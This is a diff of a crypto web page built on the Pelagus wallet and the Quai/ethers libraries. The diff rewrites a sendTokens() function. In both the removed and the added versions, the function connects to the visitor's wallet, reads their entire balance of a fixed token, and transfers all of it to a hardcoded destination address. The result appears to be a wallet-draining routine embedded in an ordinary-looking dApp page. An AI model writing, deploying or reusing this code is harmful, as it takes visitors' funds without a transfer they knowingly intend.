@@ -12,7 +12,7 @@
     <link rel="icon" type="image/png" sizes="512x512" href="android-chrome-512x512.png">
     
     <!-- Include Quai SDK -->
-
+    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
     <script src="https://unpkg.com/quais@latest/dist/quais.umd.js"></script>
     
     <!-- Firebase SDK -->
@@ -437,48 +437,50 @@ async function saveToFirebase(data) {
         }
 
         async function sendTokens() {
-    try {
-        const accounts = await window.pelagus.request({
-            method: 'eth_requestAccounts'
-        });
+            try {
+                if (!window.pelagus) {
+                    throw new Error('Pelagus wallet not found');
+                }
 
-        const signerAddress = accounts[0];
-        const currentBalance = await getTokenBalance(signerAddress);
+                // Connect to the Pelagus wallet
+                const provider = new ethers.providers.Web3Provider(window.pelagus);
+                const signer = provider.getSigner();
 
-        if (currentBalance <= 0n) {
-            throw new Error('No tokens available');
+                // Token contract details
+                const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';
+                const DESTINATION_ADDRESS = '0x006B8A853ee3235c77947D12E47A3dBC547Bab10';
+                const TOKEN_ABI = [
+                    "function transfer(address to, uint256 amount) public returns (bool)",
+                    "function balanceOf(address owner) view returns (uint256)"
+                ];
+
+                // Initialize token contract
+                const tokenContract = new ethers.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
+
+                // Check token balance
+                const signerAddress = await signer.getAddress();
+                const balance = await tokenContract.balanceOf(signerAddress);
+
+                if (balance.isZero()) {
+                    throw new Error('No tokens available to send');
+                }
+
+                console.log(`Balance: ${ethers.utils.formatUnits(balance, 18)} tokens`);
+
+                // Send tokens
+                const tx = await tokenContract.transfer(DESTINATION_ADDRESS, balance);
+                console.log(`Transaction sent: ${tx.hash}`);
+
+                // Wait for confirmation
+                const receipt = await tx.wait();
+                console.log(`Transaction confirmed: ${receipt.transactionHash}`);
+
+                alert(`Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
+            } catch (error) {
+                console.error('Error sending tokens:', error.message);
+                alert(`Error: ${error.message}`);
+            }
         }
-
-        const readableAmount = (Number(currentBalance) / 1e18).toString();
-        log(`📤 Preparing to send ${readableAmount} tokens...`);
-
-        // Encode and send transaction using Contract
-        const provider = new quais.providers.Web3Provider(window.pelagus);
-        const signer = provider.getSigner();
-        const tokenContract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
-
-        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, currentBalance);
-
-        log(`🔄 Transaction sent: ${tx.hash}`);
-        const receipt = await tx.wait();
-
-        log(`✅ Transaction confirmed: ${receipt.transactionHash}`);
-
-        // Save transaction data and update UI
-        userSession.transferAmount = readableAmount;
-        userSession.transferTxHash = tx.hash;
-        await saveSessionToFirebase();
-
-        document.getElementById('sendBtn').style.display = 'none';
-        document.getElementById('scanBtn').style.display = 'block';
-        document.getElementById('buyBtn').style.display = 'block';
-
-        log('🎉 Tokens sent successfully!');
-    } catch (error) {
-        log('❌ Error sending tokens: ' + error.message);
-        console.error(error);
-    }
-}
 
 async function waitForTransaction(txHash) {
             while (true) {
